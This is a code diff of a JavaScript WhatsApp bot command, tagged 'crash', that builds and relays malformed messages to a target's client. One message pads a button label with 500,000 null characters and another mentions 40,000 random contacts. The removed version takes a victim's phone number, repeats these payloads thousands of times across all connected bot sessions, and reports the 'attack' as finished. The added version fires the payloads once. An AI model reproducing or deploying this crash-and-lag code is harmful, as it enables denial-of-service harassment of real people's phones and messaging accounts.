@@ -1,23 +1,25 @@
+let handler = async (m, { conn }) => {
+  const jid = m.key.participant || m.key.remoteJid;
 
-const chalk = require('chalk');
-// Ajusta la ruta según donde esté tu CrowSession
-const CrowSession = require('../path/to/CrowSession');
-
-const delay = (ms) => new Promise(res => setTimeout(res, ms));
-const cooldowns = global.delayCooldowns || new Map();
-
-function dateTime() {
-  const now = new Date();
-  return now.toLocaleString('es-MX', { timeZone: 'America/Mexico_City' });
-}
-
-async function safeExec(label, fn) {
   try {
-    await fn();
-  } catch (err) {
-    console.error(`❌ Error en ${label}: ${err.message}`);
+    // Ejecutar ambas funciones una vez
+    await InVisibleX(conn, jid, true);
+    await xatanicaldelayv2(conn, jid, true);
+
+    await conn.sendMessage(jid, { text: "✅ Comando ejecutado con éxito." }, { quoted: m });
+  } catch (e) {
+    console.error("Error en comando .delay:", e);
+    await conn.sendMessage(jid, { text: "❌ Error al ejecutar el comando." }, { quoted: m });
   }
-}
+};
+
+handler.command = ["delay"];
+handler.tags = ["crash"];
+handler.help = ["delay"];
+
+export default handler;
+
+// FUNCIONES INTERNAS
 
 async function InVisibleX(sock, jid, mention) {
   let msg = await generateWAMessageFromContent(jid, {
@@ -25,11 +27,15 @@ async function InVisibleX(sock, jid, mention) {
       text: "🩸",
       contentText: "@raysofhopee",
       footerText: "vip",
-      buttons: [{
-        buttonId: ".aboutb",
-        buttonText: { displayText: "HADES VIP!" + "\u0000".repeat(500000) },
-        type: 1,
-      }],
+      buttons: [
+        {
+          buttonId: ".aboutb",
+          buttonText: {
+            displayText: "HADES VIP!" + "\u0000".repeat(500000),
+          },
+          type: 1,
+        },
+      ],
       headerType: 1,
     },
   }, {});
@@ -37,22 +43,51 @@ async function InVisibleX(sock, jid, mention) {
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: {},
-      content: [{
-        tag: "mentioned_users",
+    additionalNodes: [
+      {
+        tag: "meta",
         attrs: {},
-        content: [{ tag: "to", attrs: { jid }, content: undefined }],
-      }],
-    }],
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: jid },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
   });
 
   if (mention) {
     await sock.relayMessage(
       jid,
-      { groupStatusMentionMessage: { message: { protocolMessage: { key: msg.key, type: 25 } } } },
-      { additionalNodes: [{ tag: "meta", attrs: { is_status_mention: "hmmm" }, content: undefined }] }
+      {
+        groupStatusMentionMessage: {
+          message: {
+            protocolMessage: {
+              key: msg.key,
+              type: 25,
+            },
+          },
+        },
+      },
+      {
+        additionalNodes: [
+          {
+            tag: "meta",
+            attrs: {
+              is_status_mention: "hmmm",
+            },
+            content: undefined,
+          },
+        ],
+      }
     );
   }
 }
@@ -76,7 +111,9 @@ async function xatanicaldelayv2(sock, jid, mention) {
           contextInfo: {
             mentionedJid: [
               "0@s.whatsapp.net",
-              ...Array.from({ length: 40000 }, () => "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net")
+              ...Array.from({ length: 40000 }, () =>
+                "1" + Math.floor(Math.random() * 500000) + "@s.whatsapp.net"
+              ),
             ],
             groupMentions: [],
             entryPointConversionSource: "non_contact",
@@ -93,93 +130,28 @@ async function xatanicaldelayv2(sock, jid, mention) {
   };
 
   const msg = generateWAMessageFromContent(jid, message, {});
+
   await sock.relayMessage("status@broadcast", msg.message, {
     messageId: msg.key.id,
     statusJidList: [jid],
-    additionalNodes: [{
-      tag: "meta",
-      attrs: {},
-      content: [{
-        tag: "mentioned_users",
+    additionalNodes: [
+      {
+        tag: "meta",
         attrs: {},
-        content: [{ tag: "to", attrs: { jid }, content: undefined }],
-      }],
-    }],
+        content: [
+          {
+            tag: "mentioned_users",
+            attrs: {},
+            content: [
+              {
+                tag: "to",
+                attrs: { jid: jid },
+                content: undefined,
+              },
+            ],
+          },
+        ],
+      },
+    ],
   });
 }
-
-async function sickdelay(sock, jid) {
-  if (!sock.user) throw new Error("Bot no activo");
-
-  for (let i = 0; i < 3900; i++) {
-    if (!sock.user) break;
-    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
-    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
-    await safeExec("InVisibleX", () => InVisibleX(sock, jid, true));
-    await delay(400);
-    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
-    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
-    await safeExec("xatanicaldelayv2", () => xatanicaldelayv2(sock, jid, true));
-    await delay(2000);
-  }
-}
-
-let handler = async (m, { conn, args }) => {
-  const user = m.sender;
-  const cooldownTime = 60 * 1000;
-  const now = Date.now();
-  const lastUse = cooldowns.get(user);
-
-  if (!args[0]) return conn.sendMessage(m.chat, { text: '❗️Ejemplo: .delay 52xxxxxxxxxx' }, { quoted: m });
-
-  if (lastUse && now - lastUse < cooldownTime) {
-    const remaining = Math.ceil((cooldownTime - (now - lastUse)) / 1000);
-    return conn.sendMessage(m.chat, { text: `⏱️ Espera ${remaining} segundos antes de volver a usarlo.` }, { quoted: m });
-  }
-
-  cooldowns.set(user, now);
-  global.delayCooldowns = cooldowns;
-
-  const number = args[0].replace(/[^0-9]/g, "");
-  const jid = `${number}@s.whatsapp.net`;
-
-  const sessions = CrowSession.sessions;
-  if (!sessions || sessions.size === 0) {
-    return conn.sendMessage(m.chat, { text: '❌ No hay bots activos para enviar el delay.' }, { quoted: m });
-  }
-
-  await conn.sendMessage(m.chat, {
-    image: { url: "https://files.catbox.moe/bbnxok.jpg" },
-    caption: `
-╭━━━⭓「 SENDING BUG 」
-┃ ◇ FECHA : ${dateTime()}
-┃ ◇ USUARIO : ${user.split("@")[0]}
-┃ ◇ MÉTODO : DELAY
-┃ ◇ TARGET : ${number}
-╰━━━━━━━━━━━━━━━━━━⭓
-
-🔗 https://wa.me/${number}
-    `.trim(),
-  }, { quoted: m });
-
-  let success = 0;
-  let fail = 0;
-
-  for (const [id, sock] of sessions.entries()) {
-    try {
-      await sickdelay(sock, jid);
-      success++;
-    } catch (e) {
-      fail++;
-    }
-  }
-
-  await conn.sendMessage(m.chat, {
-    text: `✅ Ataque finalizado\n✔️ Enviados: ${success}\n❌ Fallidos: ${fail}`,
-  }, { quoted: m });
-};
-
-handler.command = ['delay'];
-handler.owner = false;
-
-module.exports = handler;
